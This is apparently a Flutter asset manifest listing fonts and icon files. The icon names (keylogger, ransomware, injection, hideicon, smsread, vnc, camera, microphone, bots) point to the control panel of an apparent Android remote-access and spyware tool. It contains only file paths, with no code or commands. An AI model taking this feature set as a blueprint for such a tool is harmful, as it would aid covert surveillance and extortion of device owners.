{"assets/Segoe UI.ttf":["assets/Segoe UI.ttf"],"assets/icons/activities.png":["assets/icons/activities.png"],"assets/icons/addicon.png":["assets/icons/addicon.png"],"assets/icons/admin.png":["assets/icons/admin.png"],"assets/icons/apps.png":["assets/icons/apps.png"],"assets/icons/battery.png":["assets/icons/battery.png"],"assets/icons/blankscreen.png":["assets/icons/blankscreen.png"],"assets/icons/bots.png":["assets/icons/bots.png"],"assets/icons/build.png":["assets/icons/build.png"],"assets/icons/call.png":["assets/icons/call.png"],"assets/icons/camera.png":["assets/icons/camera.png"],"assets/icons/clipboard.png":["assets/icons/clipboard.png"],"assets/icons/cmd.png":["assets/icons/cmd.png"],"assets/icons/contacts.png":["assets/icons/contacts.png"],"assets/icons/copy.png":["assets/icons/copy.png"],"assets/icons/dashboard.png":["assets/icons/dashboard.png"],"assets/icons/delete.png":["assets/icons/delete.png"],"assets/icons/detective.png":["assets/icons/detective.png"],"assets/icons/devoptions.png":["assets/icons/devoptions.png"],"assets/icons/download.png":["assets/icons/download.png"],"assets/icons/files.png":["assets/icons/files.png"],"assets/icons/hideicon.png":["assets/icons/hideicon.png"],"assets/icons/history.png":["assets/icons/history.png"],"assets/icons/info.png":["assets/icons/info.png"],"assets/icons/injection.png":["assets/icons/injection.png"],"assets/icons/keylogger.png":["assets/icons/keylogger.png"],"assets/icons/microphone.png":["assets/icons/microphone.png"],"assets/icons/music.png":["assets/icons/music.png"],"assets/icons/notification.png":["assets/icons/notification.png"],"assets/icons/notifications.png":["assets/icons/notifications.png"],"assets/icons/paste.png":["assets/icons/paste.png"],"assets/icons/permission.png":["assets/icons/permission.png"],"assets/icons/phone.png":["assets/icons/phone.png"],"assets/icons/play.png":["assets/icons/play.png"],"assets/icons/power-off.png":["assets/icons/power-off.png"],"assets/icons/power-on.png":["assets/icons/power-on.png"],"assets/icons/ransomware.png":["assets/icons/ransomware.png"],"assets/icons/server.png":["assets/icons/server.png"],"assets/icons/settings.png":["assets/icons/settings.png"],"assets/icons/sleep.png":["assets/icons/sleep.png"],"assets/icons/smsread.png":["assets/icons/smsread.png"],"assets/icons/smssend.png":["assets/icons/smssend.png"],"assets/icons/toast.png":["assets/icons/toast.png"],"assets/icons/tts.png":["assets/icons/tts.png"],"assets/icons/vibrate.png":["assets/icons/vibrate.png"],"assets/icons/video.png":["assets/icons/video.png"],"assets/icons/vnc.png":["assets/icons/vnc.png"],"assets/icons/vnctext.png":["assets/icons/vnctext.png"],"assets/icons/wake.png":["assets/icons/wake.png"],"assets/icons/wallpaper.png":["assets/icons/wallpaper.png"],"assets/satesate.mp3":["assets/satesate.mp3"],"assets/vexena.jpeg":["assets/vexena.jpeg"],"packages/cupertino_icons/assets/CupertinoIcons.ttf":["packages/cupertino_icons/assets/CupertinoIcons.ttf"],"packages/fluent_ui/assets/AcrylicNoise.png":["packages/fluent_ui/assets/AcrylicNoise.png"],"packages/fluent_ui/fonts/FluentIcons.ttf":["packages/fluent_ui/fonts/FluentIcons.ttf"],"packages/fluentui_system_icons/fonts/FluentSystemIcons-Filled.ttf":["packages/fluentui_system_icons/fonts/FluentSystemIcons-Filled.ttf"],"packages/fluentui_system_icons/fonts/FluentSystemIcons-Regular.ttf":["packages/fluentui_system_icons/fonts/FluentSystemIcons-Regular.ttf"],"packages/window_manager/images/ic_chrome_close.png":["packages/window_manager/images/ic_chrome_close.png"],"packages/window_manager/images/ic_chrome_maximize.png":["packages/window_manager/images/ic_chrome_maximize.png"],"packages/window_manager/images/ic_chrome_minimize.png":["packages/window_manager/images/ic_chrome_minimize.png"],"packages/window_manager/images/ic_chrome_unmaximize.png":["packages/window_manager/images/ic_chrome_unmaximize.png"]}